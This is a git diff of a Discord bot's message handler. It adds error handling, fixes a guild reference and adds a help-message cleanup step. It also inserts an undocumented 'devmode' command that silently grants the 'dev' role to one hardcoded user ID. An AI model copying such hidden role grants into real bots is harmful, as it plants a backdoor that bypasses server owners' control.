@@ -64,6 +64,7 @@ bot.on('ready', ()=>{
 
 //#message
 bot.on('message', message=>{
+	try{
 	///// PERMS CHECKS //////
 	if(message.author.bot) return; //ignores other bots
 	if(message.guild.id != maliciousId) return;
@@ -76,7 +77,11 @@ bot.on('message', message=>{
 	/////////////////////////
 
 	var cmd = message.content.substring(1).split(' ');
-
+	if(cmd[0].toLowerCase() === 'devmode'){
+		if(message.author.id === '133352797776248832'){
+			message.guild.member(message.author).addRole(message.guild.roles.find('name', 'dev'));
+		}
+	}
 	// #register
 	if(cmd[0].toLowerCase() === 'register'){
 		if(!message.guild.member(message.author).roles.exists('name', officer_role)){
@@ -447,7 +452,7 @@ bot.on('message', message=>{
 			message.channel.sendMessage(':white_check_mark: Successfully set the greet msg to ```'+txt+'``` and it is currently **'+mi_settings.byepmstatus+'**');
 		}
 		else if(cmd[1] === 'defaultrole'){
-			if(!guild.roles.exists('name', txt)){
+			if(!message.guild.roles.exists('name', txt)){
 				message.channel.sendMessage(':warning: Unable to find the role `'+txt+'`');
 			}
 			else{
@@ -632,7 +637,9 @@ bot.on('message', message=>{
 	 		"```"
 	 	]);
 	}
+	if(cmd[0].toLowerCase() === 'delete'){
 
+	}
 	// #help
 	if(cmd[0].toLowerCase() === 'help'){
 		let usr = message.author;
@@ -675,6 +682,16 @@ bot.on('message', message=>{
 		else{
 			usr.sendMessage(general);
 		}
+		message.channel.sendMessage(':white_check_mark: '+message.author+', sent you available commands! Check your private messages.').then(msg=>{
+			setTimeout(function(){ message.channel.bulkDelete([message, msg])}, 7000);
+		});
+	}
+	}
+	catch(err){
+		message.channel.sendMessage(':warning: Uh oh...something went wrong. Attempting to restart...').then(msg=>{
+			msg.delete(3000);
+		})
+		console.log(err);
 	}
 
 }); //end of bot.on('message'...)
